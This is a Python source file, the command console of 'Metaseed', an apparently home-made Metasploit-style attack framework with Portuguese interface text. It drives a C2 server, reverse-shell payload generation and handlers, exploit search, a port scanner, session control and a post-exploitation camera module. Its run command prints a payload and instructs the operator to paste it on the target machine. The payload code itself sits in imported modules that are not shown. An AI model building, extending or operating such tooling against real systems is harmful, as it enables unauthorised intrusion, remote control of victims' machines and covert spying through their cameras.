#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import random
from pathlib import Path

# Adiciona o diretório raiz ao path
sys.path.insert(0, str(Path(__file__).parent))

from utils.animations import loading_animation, show_banner, show_version
from utils.helpers import clear_screen, print_status, print_error, print_success, print_info, get_input
from config.settings import Config
from config.database import Database
from core.server import C2Server
from core.handler import MultiHandler
from core.payload_generator import PayloadGenerator
from core.exploit_manager import ExploitManager
from modules.exploits.scanner import ScannerModule
from modules.post.camera import CameraModule

class MetaseedFramework:
    def __init__(self):
        # Carregar configurações
        self.config = Config()
        
        # Inicializar banco de dados
        self.db = Database(self.config.get("DATABASE_PATH"))
        
        # Inicializar componentes
        self.server = C2Server(self.config, self.db)
        self.handler = MultiHandler(self.config)
        self.payload_generator = PayloadGenerator()
        self.exploit_manager = ExploitManager(self.config.get("DATABASE_PATH"))
        self.scanner = ScannerModule()
        self.camera = CameraModule(self.server)
        
        # Estado atual
        self.current_module = None
        self.current_session = None
        self.prompt = "metaseed"
        
    def start(self):
        # Mostra animação de carregamento
        loading_animation("Iniciando Metaseed Framework", duration=2)
        
        # Mostra banner
        clear_screen()
        show_banner(self.config.get("BANNER_STYLE"))
        show_version()
        
        # Iniciar servidor C2
        if not self.server.start_server():
            print_error("Falha ao iniciar servidor C2")
            
        # Loop principal de comando
        while True:
            try:
                if self.current_session:
                    prompt = f"metaseed({self.current_session}) > "
                else:
                    prompt = f"{self.prompt} > "
                    
                command = get_input(prompt).strip()
                
                if not command:
                    continue
                    
                self.handle_command(command)
                
            except KeyboardInterrupt:
                print("\n")
                print_status("Use 'exit' para sair")
            except Exception as e:
                print_error(f"Erro: {e}")
                
    def handle_command(self, command):
        if command == "help":
            self.show_help()
            
        elif command == "clear":
            clear_screen()
            show_banner(self.config.get("BANNER_STYLE"))
            
        elif command == "version":
            show_version()
            
        elif command == "update":
            from utils.updater import update_framework
            if update_framework():
                sys.exit(0)
                
        elif command.startswith("use"):
            self.handle_use_command(command)
            
        elif command == "show options":
            self.show_options()
            
        elif command == "show payloads":
            self.handle_show_payloads()
            
        elif command == "show exploits":
            self.handle_show_exploits()
            
        elif command == "show sessions":
            self.server.list_clients()
            
        elif command == "show handlers":
            self.handler.list_handlers()
            
        elif command.startswith("set"):
            self.handle_set_command(command)
            
        elif command == "run" or command == "exploit":
            self.handle_run_command()
            
        elif command.startswith("sessions"):
            self.handle_sessions_command(command)
            
        elif command.startswith("handler"):
            self.handle_handler_command(command)
            
        elif command.startswith("search"):
            self.handle_search_command(command)
            
        elif command == "exit":
            print_status("Saindo do Metaseed Framework...")
            sys.exit(0)
            
        else:
            print_error(f"Comando não reconhecido: {command}")
            
    def show_help(self):
        help_text = """
Comandos principais:
  help                 - Mostrar esta ajuda
  use [modulo]         - Usar um módulo específico
  set [opção] [valor]  - Configurar uma opção
  show options         - Mostrar opções configuradas
  show payloads        - Listar payloads disponíveis
  show exploits        - Listar exploits disponíveis
  show sessions        - Listar sessões ativas
  show handlers        - Listar handlers ativos
  run / exploit        - Executar o módulo atual
  sessions             - Gerenciar sessões
  handler              - Gerenciar handlers
  search [termo]       - Buscar exploits
  clear                - Limpar a tela
  version              - Mostrar versão
  update               - Atualizar framework
  exit                 - Sair do framework

Módulos disponíveis:
  payload/*            - Gerador de payloads
  auxiliary/scanner    - Scanner de rede
  auxiliary/brute      - Ferramenta de brute force
  exploit/*            - Exploits específicos
  post/camera          - Módulo de câmera
  post/file            - Gerenciador de arquivos
  post/system          - Comandos de sistema

Exemplos:
  use payload/windows/meterpreter/reverse_tcp
  set LHOST 192.168.1.100
  set LPORT 4444
  exploit
  sessions -l
  sessions -i 1
"""
        print(help_text)
        
    def handle_use_command(self, command):
        parts = command.split()
        if len(parts) < 2:
            print_error("Uso: use [modulo]")
            return
            
        module = parts[1]
        self.current_module = module
        
        if module.startswith("payload/"):
            payload_type = module.replace("payload/", "")
            if self.payload_generator.select_payload(payload_type):
                self.prompt = f"metaseed(payload/{payload_type})"
                print_success(f"Módulo payload selecionado: {payload_type}")
            else:
                self.current_module = None
                
        elif module == "auxiliary/scanner":
            self.prompt = "metaseed(scanner)"
            print_success("Módulo scanner selecionado")
            
        elif module == "post/camera":
            self.prompt = "metaseed(camera)"
            print_success("Módulo câmera selecionado")
            
        else:
            print_error(f"Módulo não encontrado: {module}")
            self.current_module = None
            
    def show_options(self):
        if self.current_module and self.current_module.startswith("payload/"):
            print("Opções atuais para payload:")
            print(f"  LHOST    - {self.config.get('LHOST')}")
            print(f"  LPORT    - {self.config.get('LPORT')}")
            print(f"  PROTOCOL - {self.config.get('PROTOCOL')}")
            print(f"  PAYLOAD  - {self.payload_generator.current_payload}")
            print(f"  ENCODING - {self.payload_generator.encoding}")
            print(f"  PLATFORM - {self.payload_generator.platform}")
            
        elif self.current_module == "auxiliary/scanner":
            print("Opções atuais para scanner:")
            print(f"  TARGET   - {self.scanner.current_target or 'Nenhum'}")
            for option, value in self.scanner.current_options.items():
                print(f"  {option.upper():<8} - {value}")
                
        else:
            print("Opções globais:")
            self.config.show()
            
    def handle_show_payloads(self):
        if len(sys.argv) > 2 and sys.argv[2] in ["windows", "linux", "android", "multi"]:
            self.payload_generator.list_payloads(sys.argv[2])
        else:
            self.payload_generator.list_payloads()
            
    def handle_show_exploits(self):
        if len(sys.argv) > 2 and sys.argv[2] in ["windows", "linux", "android"]:
            self.exploit_manager.list_exploits(sys.argv[2])
        else:
            self.exploit_manager.list_exploits()
            
    def handle_set_command(self, command):
        parts = command.split()
        if len(parts) < 3:
            print_error("Uso: set [opção] [valor]")
            return
            
        option = parts[1].upper()
        value = " ".join(parts[2:])
        
        # Configurações globais
        if option in ["LHOST", "LPORT", "PROTOCOL", "ENCODING"]:
            self.config.set(option, value)
            print_success(f"{option} => {value}")
            
            # Atualizar também no payload generator se for relevante
            if option == "PROTOCOL":
                self.payload_generator.set_protocol(value)
            elif option == "ENCODING":
                self.payload_generator.set_encoding(value)
                
        # Configurações específicas de payload
        elif self.current_module and self.current_module.startswith("payload/"):
            if option == "PAYLOAD":
                self.payload_generator.select_payload(value)
            elif option == "PLATFORM":
                self.payload_generator.set_platform(value)
                
        # Configurações específicas de scanner
        elif self.current_module == "auxiliary/scanner":
            if option == "TARGET":
                self.scanner.set_target(value)
            elif option in ["PORTS", "THREADS", "TIMEOUT"]:
                self.scanner.set_option(option.lower(), value)
                
        else:
            print_error(f"Opção não reconhecida: {option}")
            
    def handle_run_command(self):
        if self.current_module and self.current_module.startswith("payload/"):
            payload = self.payload_generator.generate_payload(
                self.config.get("LHOST"), 
                self.config.get("LPORT")
            )
            
            if payload:
                print_success("Payload gerado com sucesso!")
                print("\n" + "="*50)
                print(payload)
                print("="*50)
                print_success("Copie e cole este código na máquina alvo")
                
                # Iniciar handler automaticamente
                if self.config.get("AUTO_START"):
                    handler_id = self.handler.start_handler(
                        self.payload_generator.current_payload,
                        self.payload_generator.current_payload,
                        self.config.get("LHOST"),
                        self.config.get("LPORT"),
                        self.config.get("PROTOCOL")
                    )
                    
        elif self.current_module == "auxiliary/scanner":
            if not self.scanner.current_target:
                print_error("Nenhum target definido. Use 'set TARGET [ip]'")
                return
                
            open_ports = self.scanner.run()
            if open_ports:
                self.scanner.service_scan(self.scanner.current_target, open_ports)
                
        else:
            print_error("Nenhum módulo selecionado ou módulo não suporta execução direta")
            
    def handle_sessions_command(self, command):
        parts = command.split()
        
        if len(parts) == 1 or parts[1] == "-l":
            self.server.list_clients()
            
        elif len(parts) >= 2 and parts[1] == "-i":
            if len(parts) < 3:
                print_error("Uso: sessions -i [id]")
                return
                
            session_id = parts[2]
            if session_id in self.server.clients:
                self.current_session = session_id
                self.prompt = f"metaseed({session_id})"
                print_success(f"Interagindo com sessão {session_id}")
                
                # Mostrar informações da sessão
                client = self.server.clients[session_id]
                print_info(f"OS: {client['os']}")
                print_info(f"Usuário: {client['username']}")
                print_info(f"Endereço: {client['address'][0]}:{client['address'][1]}")
                print_info(f"Protocolo: {client['protocol']}")
                
            else:
                print_error(f"Sessão não encontrada: {session_id}")
                
        elif len(parts) >= 2 and parts[1] == "-k":
            if len(parts) < 3:
                print_error("Uso: sessions -k [id]")
                return
                
            session_id = parts[2]
            if session_id in self.server.clients:
                self.server.remove_client(session_id)
                print_success(f"Sessão {session_id} finalizada")
            else:
                print_error(f"Sessão não encontrada: {session_id}")
                
        else:
            print_error("Uso: sessions [-l | -i id | -k id]")
            
    def handle_handler_command(self, command):
        parts = command.split()
        
        if len(parts) == 1:
            self.handler.list_handlers()
            
        elif len(parts) >= 2 and parts[1] == "start":
            if len(parts) < 3:
                print_error("Uso: handler start [payload_type]")
                return
                
            payload_type = parts[2]
            handler_id = self.handler.start_handler(
                payload_type,
                payload_type,
                self.config.get("LHOST"),
                self.config.get("LPORT"),
                self.config.get("PROTOCOL")
            )
            
        elif len(parts) >= 2 and parts[1] == "stop":
            if len(parts) < 3:
                print_error("Uso: handler stop [id]")
                return
                
            handler_id = parts[2]
            self.handler.stop_handler(handler_id)
            
        else:
            print_error("Uso: handler [start type | stop id]")
            
    def handle_search_command(self, command):
        parts = command.split()
        if len(parts) < 2:
            print_error("Uso: search [termo]")
            return
            
        keyword = " ".join(parts[1:])
        self.exploit_manager.search_exploits(keyword)

if __name__ == "__main__":
    framework = MetaseedFramework()
    framework.start()
